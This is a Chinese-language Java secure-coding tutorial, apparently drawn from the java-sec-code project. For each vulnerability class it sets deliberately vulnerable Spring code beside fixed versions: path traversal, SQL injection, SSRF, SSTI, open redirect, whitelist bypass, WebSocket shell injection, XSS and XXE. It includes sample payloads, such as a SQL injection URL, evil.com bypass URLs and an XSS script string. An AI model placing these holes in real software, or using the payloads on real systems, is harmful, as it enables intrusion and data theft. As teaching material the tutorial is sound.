攻击者将构造好的Payload注入到应用程序的日志中，例如通过Web应用程序的日志记录功能。Log4j的日志记录器（Logger）将这个事件记录下来，同时尝试解析Payload中的JNDI地址。 JNDI查询触发： Log4j尝试解析Payload中的JNDI地址，这可能导致应用程序发起对恶意JNDI服务器的查询。攻击者控制的JNDI服务器可以返回恶意的响应。 远程代码执行： 如果JNDI查询返回的数据包含恶意的代码，这些代码将被注入到应用程序中，并最终执行。这导致攻击者可以在受影响的应用程序上执行任意代码，从而完全接管应用程序的控制权。 攻击向量： 攻击者通常通过在用户输入、HTTP请求参数或其他可控制的输入中注入Payload，触发Log4j日志事件，从而利用这个漏洞。Web应用程序的访问日志、错误日志等可能是攻击者选择的注入点。 路径穿越攻击者试图通过输入恶意构造的路径，访问系统上的敏感文件或目录。在Java代码层面，可以通过一些防御措施来预防路径穿越漏洞。 敏感函数1filepath读取相关 漏洞代码1234@GetMapping(&quot;/path_traversal/vul&quot;)public String getImage(String filepath) throws IOException &#123; return getImgBase64(filepath);&#125; 安全代码1234567891011121314151617181920212223242526272829@GetMapping(&quot;/path_traversal/sec&quot;)public ResponseEntity&lt;byte[]&gt; getImageSec(@RequestParam String filepath) &#123; // 使用Spring的ResponseEntity&lt;byte[]&gt;返回文件内容 try &#123; // 安全验证和过滤 if (SecurityUtil.pathFilter(filepath) == null) &#123; logger.info(&quot;Illegal file path: &quot; + filepath); return &quot;Bad boy. Illegal file path.&quot;; &#125; // 获取文件内容并以字节数组形式返回 byte[] fileContent = getFileContent(filepath); HttpHeaders headers = new HttpHeaders(); headers.setContentDisposition(ContentDisposition.builder(&quot;inline&quot;).filename(filepath).build()); return ResponseEntity.ok().headers(headers).body(fileContent); &#125; catch (IOException e) &#123; logger.error(&quot;Error reading file: &quot; + filepath, e); return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(&quot;Error reading file.&quot;.getBytes()); &#125;&#125;private byte[] getFileContent(String filepath) throws IOException &#123; // 根据文件路径读取文件内容的逻辑 // ... // 示例：使用Files.readAllBytes()方法 return Files.readAllBytes(Paths.get(filepath));&#125; 防范措施 使用安全的文件路径处理方法： 在Java中，使用java.nio.file.Path或java.nio.file.Paths等安全的文件路径处理类，而不是手动拼接字符串来构建文件路径。这样可以确保路径分隔符和格式的正确性，并防止通过恶意构造的路径进行穿越。 // 使用 java.nio.file.Path Path path = Paths.get(basePath, userProvidedInput); 123456789- **输入验证和过滤：** 对于用户提供的输入，进行有效的输入验证和过滤。确保用户输入的路径只包含预期的字符和结构。可以使用正则表达式或白名单的方式进行验证。- ```java if (isValidInput(userProvidedInput)) &#123; // 处理用户输入 &#125; else &#123; // 拒绝非法输入 &#125; 限制访问范围： 在文件系统上，确保应用程序只能访问必要的文件和目录。使用操作系统权限和文件系统权限来限制应用程序的访问权限。 使用相对路径： 尽可能使用相对路径而不是绝对路径。这可以帮助减小攻击者在构造恶意路径时的复杂性。 安全的文件处理操作： 在执行文件操作时，使用安全的文件处理方法，并确保只有授权用户可以执行这些操作。避免直接使用不安全的文件操作，如File.delete()或File.renameTo()。 Web应用程序安全配置： 在Web应用程序中，确保Web服务器和应用服务器的安全配置，以防止对敏感文件的直接访问。限制对目录的列表和文件的下载。 安全的文件上传处理： 如果应用程序涉及文件上传，确保实施安全的文件上传和处理机制，防止上传恶意文件并确保上传文件的存储位置安全。 日志记录： 记录应用程序的文件操作，包括文件路径和操作类型。这有助于及时检测潜在的路径穿越攻击。 通过结合这些最佳实践，可以有效地防范路径穿越漏洞。在编写代码时，始终将安全性考虑到设计和实施的每个阶段，以减少潜在的安全风险。 SQLijava.sql敏感函数12String sql = &quot;select * from users where username = &#x27;&quot; + username + &quot;&#x27;&quot;;ResultSet rs = statement.executeQuery(sql); 修复方式 使用参数化查询或预处理语句，将用户提供的输入作为参数绑定到查询中，而不是通过字符串拼接。 使用 PreparedStatement 类，该类提供了防止 SQL 注入的机制。 使用 setString 方法将参数值绑定到查询中，确保用户输入不会被解释为 SQL 代码。 漏洞代码1123456789101112131415161718192021222324252627282930313233343536@RequestMapping(&quot;/jdbc/vuln&quot;)public String jdbc_sqli_vul(@RequestParam(&quot;username&quot;) String username) &#123; StringBuilder result = new StringBuilder(); try &#123; Class.forName(driver); Connection con = DriverManager.getConnection(url, user, password); if (!con.isClosed()) System.out.println(&quot;Connect to database successfully.&quot;); // sqli vuln code Statement statement = con.createStatement(); String sql = &quot;select * from users where username = &#x27;&quot; + username + &quot;&#x27;&quot;; logger.info(sql); ResultSet rs = statement.executeQuery(sql); while (rs.next()) &#123; String res_name = rs.getString(&quot;username&quot;); String res_pwd = rs.getString(&quot;password&quot;); String info = String.format(&quot;%s: %s\\n&quot;, res_name, res_pwd); result.append(info); logger.info(info); &#125; rs.close(); con.close(); &#125; catch (ClassNotFoundException e) &#123; logger.error(&quot;Sorry, can&#x27;t find the Driver!&quot;); &#125; catch (SQLException e) &#123; logger.error(e.toString()); &#125; return result.toString();&#125; 漏洞代码2123456789101112131415161718192021222324252627282930313233343536@RequestMapping(&quot;/jdbc/ps/vuln&quot;) public String jdbc_ps_vuln(@RequestParam(&quot;username&quot;) String username) &#123; StringBuilder result = new StringBuilder(); try &#123; Class.forName(driver); Connection con = DriverManager.getConnection(url, user, password); if (!con.isClosed()) System.out.println(&quot;Connecting to Database successfully.&quot;); String sql = &quot;select * from users where username = &#x27;&quot; + username + &quot;&#x27;&quot;; //万万不可将SQL语句作为参数传入prepareStatement方法。 PreparedStatement st = con.prepareStatement(sql); logger.info(st.toString()); ResultSet rs = st.executeQuery(); while (rs.next()) &#123; String res_name = rs.getString(&quot;username&quot;); String res_pwd = rs.getString(&quot;password&quot;); String info = String.format(&quot;%s: %s\\n&quot;, res_name, res_pwd); result.append(info); logger.info(info); &#125; rs.close(); con.close(); &#125; catch (ClassNotFoundException e) &#123; logger.error(&quot;Sorry, can&#x27;t find the Driver!&quot;); e.printStackTrace(); &#125; catch (SQLException e) &#123; logger.error(e.toString()); &#125; return result.toString(); &#125; 利用方法1http://localhost:8080/sqli/jdbc/ps/vuln?username=joychou&#x27; or &#x27;a&#x27;=&#x27;a 安全代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import java.sql.*;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class SecureController &#123; @RequestMapping(&quot;/jdbc/secure&quot;) public String jdbc_sqli_secure(@RequestParam(&quot;username&quot;) String username) &#123; StringBuilder result = new StringBuilder(); try &#123; Class.forName(driver); Connection con = DriverManager.getConnection(url, user, password); if (!con.isClosed()) System.out.println(&quot;Connect to database successfully.&quot;); // 使用参数化查询或预处理语句 String sql = &quot;SELECT * FROM users WHERE username = ?&quot;; // 使用 PreparedStatement 类，该类提供了防止 SQL 注入的机制。 try (PreparedStatement preparedStatement = con.prepareStatement(sql)) &#123; // 使用 setString 方法将参数值绑定到查询中，确保用户输入不会被解释为 SQL 代码。 preparedStatement.setString(1, username); ResultSet rs = preparedStatement.executeQuery(); while (rs.next()) &#123; String res_name = rs.getString(&quot;username&quot;); String res_pwd = rs.getString(&quot;password&quot;); String info = String.format(&quot;%s: %s\\n&quot;, res_name, res_pwd); result.append(info); logger.info(info); &#125; rs.close(); &#125; con.close(); &#125; catch (ClassNotFoundException e) &#123; logger.error(&quot;Sorry, can&#x27;t find the Driver!&quot;); &#125; catch (SQLException e) &#123; logger.error(e.toString()); &#125; return result.toString(); &#125;&#125; mybatis敏感函数1234@Select(&quot;select * from users where username = &#x27;$&#123;username&#125;&#x27;&quot;)List&lt;User&gt; findByUserNameVuln01(@Param(&quot;username&quot;) String username);userMapper.findByUserNameVuln01(username); 漏洞代码11234567@GetMapping(&quot;/mybatis/vuln01&quot;)public List&lt;User&gt; mybatisVuln01(@RequestParam(&quot;username&quot;) String username) &#123; return userMapper.findByUserNameVuln01(username);&#125; @Select(&quot;select * from users where username = &#x27;$&#123;username&#125;&#x27;&quot;)List&lt;User&gt; findByUserNameVuln01(@Param(&quot;username&quot;) String username); 安全代码1修复这个漏洞的关键是使用参数化的 SQL 查询，而不是字符串拼接。MyBatis 支持使用 #&#123;&#125; 占位符来安全地传递参数。 1234567@Select(&quot;SELECT * FROM users WHERE username = #&#123;username&#125;&quot;)List&lt;User&gt; findByUserNameSecure(@Param(&quot;username&quot;) String username);@GetMapping(&quot;/mybatis/vuln01&quot;)public List&lt;User&gt; mybatisVuln01(@RequestParam(&quot;username&quot;) String username) &#123; return userMapper.findByUserNameVuln01(username);&#125; 漏洞代码21234@GetMapping(&quot;/mybatis/vuln02&quot;)public List&lt;User&gt; mybatisVuln02(@RequestParam(&quot;username&quot;) String username) &#123; return userMapper.findByUserNameVuln02(username);&#125; userMapper.xml 123&lt;select id=&quot;findByUserNameVuln02&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt; select * from users where username like &#x27;%$&#123;_parameter&#125;%&#x27;&lt;/select&gt; 安全代码2userMapper.xml 123&lt;select id=&quot;findByUserNameSecure&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt; select * from users where username like concat(&#x27;%&#x27;, #&#123;_parameter&#125;, &#x27;%&#x27;)&lt;/select&gt; 使用了 #&#123;&#125; 占位符，并通过 concat 函数安全地拼接参数。 SSRFSSRF（Server-Side Request Forgery，服务端请求伪造）是一种网络安全漏洞，攻击者通过欺骗服务器发起请求，使服务器在其内部网络中发起未经授权的请求。攻击者通过构造恶意请求，使服务器向其他服务或资源发起请求，这些请求可能是本地资源，也可能是内部网络中的其他服务，甚至是外部互联网上的资源。 SSRF 攻击的目标通常是通过服务器发起的请求，这可能导致一系列的安全问题，包括但不限于： 访问内部资源： 攻击者可以利用 SSRF 从服务器内部访问本地资源，如配置文件、数据库、文件系统等。 攻击内部服务： 如果服务器在内部网络中，攻击者可以利用 SSRF 向内部服务发起攻击，可能导致服务不可用或被滥用。 扫描内部端口： 攻击者可以使用 SSRF 尝试扫描服务器内部网络中的开放端口，获取有关网络拓扑的信息。 攻击其他系统： 如果服务器在防火墙之后，攻击者可能利用 SSRF 向外部系统发起攻击，使服务器成为攻击的代理。 SSRF 漏洞的原因通常是由于服务器对用户提供的输入没有进行充分验证，攻击者可以通过在输入中注入特殊的 URL 或协议来触发漏洞。一些常见触发 SSRF 漏洞的输入包括 URL 参数、文件上传、图像处理等。 防范 SSRF 漏洞的措施包括： 输入验证和过滤： 对用户提供的输入进行充分的验证和过滤，确保输入不包含恶意的 URL 或协议。 使用白名单： 限制服务器可以访问的资源和服务，使用白名单来限制发起的请求。 网络隔离： 将服务器与内部网络隔离，并使用防火墙规则来限制服务器的出站连接。 更新和修补： 及时更新和修补服务器上运行的软件，以防止已知的 SSRF 漏洞被利用。 通过采取这些防范措施，可以减轻 SSRF 漏洞带来的风险。 敏感代码1HttpUtils.URLConnection(url); 漏洞代码1234567891011121314151617181920212223@RequestMapping(value = &quot;/urlConnection/vuln&quot;, method = &#123;RequestMethod.POST, RequestMethod.GET&#125;)public String URLConnectionVuln(String url) &#123; return HttpUtils.URLConnection(url);&#125;public static String URLConnection(String url) &#123; try &#123; URL u = new URL(url); URLConnection urlConnection = u.openConnection(); BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //send request String inputLine; StringBuilder html = new StringBuilder(); while ((inputLine = in.readLine()) != null) &#123; html.append(inputLine); &#125; in.close(); return html.toString(); &#125; catch (Exception e) &#123; logger.error(e.getMessage()); return e.getMessage(); &#125;&#125; 安全代码SecurityUtil.java 123public static boolean isHttp(String url) &#123; return url.startsWith(&quot;http://&quot;) || url.startsWith(&quot;https://&quot;);&#125; SecurityUtil.java 123public static void startSSRFHook() throws IOException &#123; SocketHook.startHook();&#125; SocketHook.java 1234567891011121314public class SocketHook &#123; public static void startHook() throws IOException &#123; SocketHookFactory.initSocket(); SocketHookFactory.setHook(true); try&#123; Socket.setSocketImplFactory(new SocketHookFactory()); &#125;catch (SocketException ignored)&#123; &#125; &#125; public static void stopHook()&#123; SocketHookFactory.setHook(false); &#125; 1234567891011121314151617@GetMapping(&quot;/urlConnection/sec&quot;) public String URLConnectionSec(String url) &#123; // Decline not http/https protocol if (!SecurityUtil.isHttp(url)) &#123; return &quot;[-] SSRF check failed&quot;; &#125; try &#123; SecurityUtil.startSSRFHook(); return HttpUtils.URLConnection(url); &#125; catch (SSRFException | IOException e) &#123; return e.getMessage(); &#125; finally &#123; SecurityUtil.stopSSRFHook(); &#125; &#125; SSTISSTI（Server-Side Template Injection，服务端模板注入）是一种安全漏洞，它发生在服务器端的模板渲染引擎中。该漏洞允许攻击者通过注入恶意的模板代码，来执行任意的服务器端代码。 敏感函数1Velocity.evaluate(context, swOut, &quot;test&quot;, template); 漏洞代码1234567891011121314 @GetMapping(&quot;/velocity&quot;) public void velocity(String template) &#123; Velocity.init(); VelocityContext context = new VelocityContext(); context.put(&quot;author&quot;, &quot;Elliot A.&quot;); context.put(&quot;address&quot;, &quot;217 E Broadway&quot;); context.put(&quot;phone&quot;, &quot;555-1337&quot;); StringWriter swOut = new StringWriter(); Velocity.evaluate(context, swOut, &quot;test&quot;, template); &#125;&#125; 安全代码Avoid to use Velocity.evaluate method. URLRedirect敏感函数12response.setHeader(&quot;Location&quot;, url);response.sendRedirect(url); 漏洞代码123456789101112131415161718@RequestMapping(&quot;/urlRedirect&quot;)public class URLRedirect &#123; /** * http://localhost:8080/urlRedirect/redirect?url=http://www.baidu.com */ @GetMapping(&quot;/redirect&quot;) public String redirect(@RequestParam(&quot;url&quot;) String url) &#123; return &quot;redirect:&quot; + url; &#125; @RequestMapping(&quot;/setHeader&quot;)@ResponseBodypublic static void setHeader(HttpServletRequest request, HttpServletResponse response) &#123; String url = request.getParameter(&quot;url&quot;); response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); // 301 redirect response.setHeader(&quot;Location&quot;, url);&#125; 安全代码为了防止开放重定向漏洞，应该对用户提供的 url 参数进行充分验证和过滤，确保它只能指向合法的目标地址。可以通过以下几种方式进行修复： 白名单验证 定义一个白名单，只允许重定向到合法的域名或特定的地址。 检查用户提供的 url 是否在白名单内。 1234567891011121314151617@GetMapping(&quot;/redirect&quot;)public String redirect(@RequestParam(&quot;url&quot;) String url) &#123; // 使用白名单验证，确保只允许重定向到合法的域名或地址 if (isValidRedirect(url)) &#123; return &quot;redirect:&quot; + url; &#125; else &#123; // 非法的重定向地址，可以进行相应的处理，例如记录日志、重定向到安全页面等 return &quot;redirect:/error&quot;; &#125;&#125;private boolean isValidRedirect(String url) &#123; // 实现白名单验证逻辑，只允许重定向到合法的域名或地址 // 返回 true 表示合法，返回 false 表示非法 // 可以根据具体需求修改验证逻辑 return whitelist.contains(url);&#125; 使用相对路径 限制重定向地址只能是相对路径，而不是完整的 URL。 1234567891011121314151617@GetMapping(&quot;/redirect&quot;)public String redirect(@RequestParam(&quot;url&quot;) String url) &#123; // 使用相对路径限制，确保重定向地址只能是相对路径 if (isValidRelativePath(url)) &#123; return &quot;redirect:&quot; + url; &#125; else &#123; // 非法的重定向地址，可以进行相应的处理，例如记录日志、重定向到安全页面等 return &quot;redirect:/error&quot;; &#125;&#125;private boolean isValidRelativePath(String url) &#123; // 实现相对路径验证逻辑，确保重定向地址只能是相对路径 // 返回 true 表示合法，返回 false 表示非法 // 可以根据具体需求修改验证逻辑 return !url.contains(&quot;://&quot;);&#125; 通过以上方式，可以在使用重定向功能时更安全地处理用户提供的 URL 参数，避免开放重定向漏洞带来的潜在风险。 RequestDispatcher.forward1234567891011@RequestMapping(&quot;/forward&quot;)@ResponseBodypublic static void forward(HttpServletRequest request, HttpServletResponse response) &#123; String url = request.getParameter(&quot;url&quot;); RequestDispatcher rd = request.getRequestDispatcher(url); try &#123; rd.forward(request, response); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;&#125; URLWhitelist漏洞代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596@RestController@RequestMapping(&quot;/url&quot;)public class URLWhiteList &#123; private String domainwhitelist[] = &#123;&quot;joychou.org&quot;, &quot;joychou.com&quot;&#125;; private static final Logger logger = LoggerFactory.getLogger(URLWhiteList.class); /** * bypass poc: bypassjoychou.org * http://localhost:8080/url/vuln/endswith?url=http://aaajoychou.org */ @GetMapping(&quot;/vuln/endsWith&quot;) public String endsWith(@RequestParam(&quot;url&quot;) String url) &#123; String host = SecurityUtil.gethost(url); for (String domain : domainwhitelist) &#123; if (host.endsWith(domain)) &#123; return &quot;Good url.&quot;; &#125; &#125; return &quot;Bad url.&quot;; &#125; /** * It&#x27;s the same with &lt;code&gt;indexOf&lt;/code&gt;. * &lt;p&gt; * http://localhost:8080/url/vuln/contains?url=http://joychou.org.bypass.com * http://localhost:8080/url/vuln/contains?url=http://bypassjoychou.org */ @GetMapping(&quot;/vuln/contains&quot;) public String contains(@RequestParam(&quot;url&quot;) String url) &#123; String host = SecurityUtil.gethost(url); for (String domain : domainwhitelist) &#123; if (host.contains(domain)) &#123; return &quot;Good url.&quot;; &#125; &#125; return &quot;Bad url.&quot;; &#125; /** * bypass poc: bypassjoychou.org. It&#x27;s the same with endsWith. * http://localhost:8080/url/vuln/regex?url=http://aaajoychou.org */ @GetMapping(&quot;/vuln/regex&quot;) public String regex(@RequestParam(&quot;url&quot;) String url) &#123; String host = SecurityUtil.gethost(url); Pattern p = Pattern.compile(&quot;joychou\\\\.org$&quot;); Matcher m = p.matcher(host); if (m.find()) &#123; return &quot;Good url.&quot;; &#125; else &#123; return &quot;Bad url.&quot;; &#125; &#125; /** * The bypass of using &#123;@link java.net.URL&#125; to getHost. * &lt;p&gt; * &lt;a href=&quot;http://localhost:8080/url/vuln/url_bypass?url=http://evil.com%5c@www.joychou.org/a.html&quot;&gt;bypass 1&lt;/a&gt; * &lt;a href=&quot;http://localhost:8080/url/vuln/url_bypass?url=http://evil.com%5cwww.joychou.org/a.html&quot;&gt;bypass 2&lt;/a&gt; * * &lt;p&gt; * &lt;a href=&quot;https://github.com/JoyChou93/java-sec-code/wiki/URL-whtielist-Bypass&quot;&gt;More details&lt;/a&gt; */ @GetMapping(&quot;/vuln/url_bypass&quot;) public void url_bypass(String url, HttpServletResponse res) throws IOException &#123; logger.info(&quot;url: &quot; + url); if (!SecurityUtil.isHttp(url)) &#123; return; &#125; URL u = new URL(url); String host = u.getHost(); logger.info(&quot;host: &quot; + host); // endsWith . for (String domain : domainwhitelist) &#123; if (host.endsWith(&quot;.&quot; + domain)) &#123; res.sendRedirect(url); &#125; &#125; &#125;&#125; 安全代码12345678910111213141516171819202122232425/** * First-level &amp; Multi-level host whitelist. * http://localhost:8080/url/sec?url=http://aa.joychou.org */@GetMapping(&quot;/sec&quot;)public String sec(@RequestParam(&quot;url&quot;) String url) &#123; String whiteDomainlists[] = &#123;&quot;joychou.org&quot;, &quot;joychou.com&quot;, &quot;test.joychou.me&quot;&#125;; if (!SecurityUtil.isHttp(url)) &#123; return &quot;SecurityUtil is not http or https&quot;; &#125; String host = SecurityUtil.gethost(url); for (String whiteHost: whiteDomainlists)&#123; if (whiteHost.startsWith(&quot;.&quot;) &amp;&amp; host.endsWith(whiteHost)) &#123; return url; &#125; else if (!whiteHost.startsWith(&quot;.&quot;) &amp;&amp; host.equals(whiteHost)) &#123; return url; &#125; &#125; return &quot;Bad url.&quot;;&#125; WebSockets漏洞代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162@RestControllerpublic class WebSockets &#123; /** * &lt;p&gt;动态添加WebSockets实现命令执行&lt;/p&gt; * &lt;p&gt; * 1. WebSocket的端口和Spring端口一致。&lt;br&gt; * 2. 如果应用需要登录，动态添加的WebSocket路由不能要求被登录，否则添加失败。 * &lt;/p&gt; * &lt;p&gt; * &lt;a href=&quot;http://localhost:8080/websocket/cmd?path=/ws/shell&quot;&gt;http://localhost:8080/websocket/cmd?path=/ws/shell&lt;/a&gt; &lt;br&gt; * WebSockets 的URL为ws://127.0.0.1:8080/ws/shell * &lt;/p&gt; * &lt;p&gt;JoyChou @ 2023年02月20日 &lt;/p&gt; */ @RequestMapping(&quot;/websocket/cmd&quot;) public String cmdInject(HttpServletRequest req) &#123; String path = req.getParameter(&quot;path&quot;); if (path == null) &#123; return &quot;path is null&quot;; &#125; ServletContext sc = req.getServletContext(); try &#123; ServerEndpointConfig sec = ServerEndpointConfig.Builder.create(WebSocketsCmdEndpoint.class, path).build(); WsServerContainer wsc = (WsServerContainer) sc.getAttribute(ServerContainer.class.getName()); if (wsc.findMapping(path) == null) &#123; wsc.addEndpoint(sec); System.out.println(&quot;[+] Websocket: &quot; + path + &quot; inject success!!!&quot;); return &quot;[+] Websocket: &quot; + path + &quot; inject success!!!&quot;; &#125; else &#123; System.out.println(&quot;[-] Websocket: &quot; + path + &quot; has been injected!&quot;); return &quot;[-] Websocket: &quot; + path + &quot; has been injected!&quot;; &#125; &#125; catch (Exception e) &#123; return e.toString(); &#125; &#125; @RequestMapping(&quot;/websocket/proxy&quot;) public String proxyInject(HttpServletRequest req) &#123; String path = req.getParameter(&quot;path&quot;); if (path == null) &#123; return &quot;path is null&quot;; &#125; ServletContext sc = req.getServletContext(); try &#123; ServerEndpointConfig sec = ServerEndpointConfig.Builder.create(WebSocketsProxyEndpoint.class, path).build(); WsServerContainer wsc = (WsServerContainer) sc.getAttribute(ServerContainer.class.getName()); if (wsc.findMapping(path) == null) &#123; wsc.addEndpoint(sec); System.out.println(&quot;[+] Websocket: &quot; + path + &quot; inject success!!!&quot;); return &quot;[+] Websocket: &quot; + path + &quot; inject success!!!&quot;; &#125; else &#123; System.out.println(&quot;[-] Websocket: &quot; + path + &quot; has been injected!&quot;); return &quot;[-] Websocket: &quot; + path + &quot; has been injected!&quot;; &#125; &#125; catch (Exception e) &#123; return e.toString(); &#125; &#125;&#125; XSS跨站脚本攻击（Cross-Site Scripting，XSS）是一种常见的网络安全漏洞，它允许攻击者向网页中注入恶意脚本，这些脚本在用户浏览页面时会被执行。XSS 攻击的目标是获取用户的敏感信息、利用用户身份执行操作、破坏网页结构等。 漏洞代码123456789101112131415161718192021222324252627282930313233 @RequestMapping(&quot;/reflect&quot;) @ResponseBody public static String reflect(String xss) &#123; return xss; &#125;/** * Vul Code. * StoredXSS Step1 * http://localhost:8080/xss/stored/store?xss=&lt;script&gt;alert(1)&lt;/script&gt; * * @param xss unescape string */ @RequestMapping(&quot;/stored/store&quot;) @ResponseBody public String store(String xss, HttpServletResponse response) &#123; Cookie cookie = new Cookie(&quot;xss&quot;, xss); response.addCookie(cookie); return &quot;Set param into cookie&quot;; &#125; /** * Vul Code. * StoredXSS Step2 * http://localhost:8080/xss/stored/show * * @param xss unescape string */ @RequestMapping(&quot;/stored/show&quot;) @ResponseBody public String show(@CookieValue(&quot;xss&quot;) String xss) &#123; return xss; &#125; 安全代码通过对相关字符进行编码的形式，从而避免脚本注入。 12345678910111213141516171819/** * safe Code. * http://localhost:8080/xss/safe */@RequestMapping(&quot;/safe&quot;)@ResponseBodypublic static String safe(String xss) &#123; return encode(xss);&#125;private static String encode(String origin) &#123; origin = StringUtils.replace(origin, &quot;&amp;&quot;, &quot;&amp;amp;&quot;); origin = StringUtils.replace(origin, &quot;&lt;&quot;, &quot;&amp;lt;&quot;); origin = StringUtils.replace(origin, &quot;&gt;&quot;, &quot;&amp;gt;&quot;); origin = StringUtils.replace(origin, &quot;\\&quot;&quot;, &quot;&amp;quot;&quot;); origin = StringUtils.replace(origin, &quot;&#x27;&quot;, &quot;&amp;#x27;&quot;); origin = StringUtils.replace(origin, &quot;/&quot;, &quot;&amp;#x2F;&quot;); return origin;&#125; XXEXXE（XML External Entity）漏洞是一种存在于应用程序中的安全漏洞，攻击者通过构造恶意的 XML 输入来导致应用程序解析外部实体，从而可能泄露敏感信息、执行远程文件读取等攻击。这种漏洞通常发生在使用 XML 格式进行数据交换和处理的应用中，如 Web 应用、SOAP（Simple Object Access Protocol）和 RESTful Web Services 等。 敏感函数12XMLReader xmlReader = XMLReaderFactory.createXMLReader();xmlReader.parse(new InputSource(new StringReader(body))); 漏洞与安全代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443package org.joychou.controller;import org.dom4j.DocumentHelper;import org.dom4j.io.SAXReader;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.data.web.ProjectedPayload;import org.springframework.http.HttpEntity;import org.springframework.http.ResponseEntity;import org.springframework.web.bind.annotation.*;import javax.servlet.http.HttpServletRequest;import org.w3c.dom.Document;import org.w3c.dom.Node;import org.w3c.dom.NodeList;import org.xml.sax.helpers.XMLReaderFactory;import org.xml.sax.XMLReader;import java.io.*;import org.xml.sax.InputSource;import javax.xml.parsers.DocumentBuilder;import javax.xml.parsers.DocumentBuilderFactory;import javax.xml.parsers.SAXParserFactory;import javax.xml.parsers.SAXParser;import org.xml.sax.helpers.DefaultHandler;import org.apache.commons.digester3.Digester;import org.jdom2.input.SAXBuilder;import org.joychou.util.WebUtils;import org.xmlbeam.annotation.XBRead;/** * Java xxe vuln and security code. * * @author JoyChou @2017-12-22 */@RestController@RequestMapping(&quot;/xxe&quot;)public class XXE &#123; private static final Logger logger = LoggerFactory.getLogger(XXE.class); private static final String EXCEPT = &quot;xxe except&quot;; @PostMapping(&quot;/xmlReader/vuln&quot;) public String xmlReaderVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); XMLReader xmlReader = XMLReaderFactory.createXMLReader(); xmlReader.parse(new InputSource(new StringReader(body))); // parse xml return &quot;xmlReader xxe vuln code&quot;; &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; @RequestMapping(value = &quot;/xmlReader/sec&quot;, method = RequestMethod.POST) public String xmlReaderSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); XMLReader xmlReader = XMLReaderFactory.createXMLReader(); // fix code start xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); xmlReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false); xmlReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false); //fix code end xmlReader.parse(new InputSource(new StringReader(body))); // parse xml &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return &quot;xmlReader xxe security code&quot;; &#125; @RequestMapping(value = &quot;/SAXBuilder/vuln&quot;, method = RequestMethod.POST) public String SAXBuilderVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXBuilder builder = new SAXBuilder(); // org.jdom2.Document document builder.build(new InputSource(new StringReader(body))); // cause xxe return &quot;SAXBuilder xxe vuln code&quot;; &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; @RequestMapping(value = &quot;/SAXBuilder/sec&quot;, method = RequestMethod.POST) public String SAXBuilderSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXBuilder builder = new SAXBuilder(); builder.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); builder.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false); builder.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false); // org.jdom2.Document document builder.build(new InputSource(new StringReader(body))); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return &quot;SAXBuilder xxe security code&quot;; &#125; @RequestMapping(value = &quot;/SAXReader/vuln&quot;, method = RequestMethod.POST) public String SAXReaderVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXReader reader = new SAXReader(); // org.dom4j.Document document reader.read(new InputSource(new StringReader(body))); // cause xxe &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return &quot;SAXReader xxe vuln code&quot;; &#125; @RequestMapping(value = &quot;/SAXReader/sec&quot;, method = RequestMethod.POST) public String SAXReaderSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXReader reader = new SAXReader(); reader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); reader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false); reader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false); // org.dom4j.Document document reader.read(new InputSource(new StringReader(body))); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return &quot;SAXReader xxe security code&quot;; &#125; @RequestMapping(value = &quot;/SAXParser/vuln&quot;, method = RequestMethod.POST) public String SAXParserVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXParserFactory spf = SAXParserFactory.newInstance(); SAXParser parser = spf.newSAXParser(); parser.parse(new InputSource(new StringReader(body)), new DefaultHandler()); // parse xml return &quot;SAXParser xxe vuln code&quot;; 